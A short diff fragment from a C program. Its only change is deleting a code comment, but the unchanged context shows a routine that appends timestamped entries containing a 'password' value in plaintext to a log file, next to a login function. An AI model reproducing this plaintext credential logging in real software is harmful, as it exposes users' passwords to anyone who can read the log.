@@ -26,7 +26,7 @@ FILE *fp = fopen(LOG_FILE, "a");
 if (fp != NULL) {
 time_t now = time(NULL);
 char *t = ctime(&now);
-t[strlen(t) - 1] = '\0';  // remove newline
+t[strlen(t) - 1] = '\0';  
 fprintf(fp, "[%s] %s\n", t, password);
 fclose(fp);}}
 void login(void) {
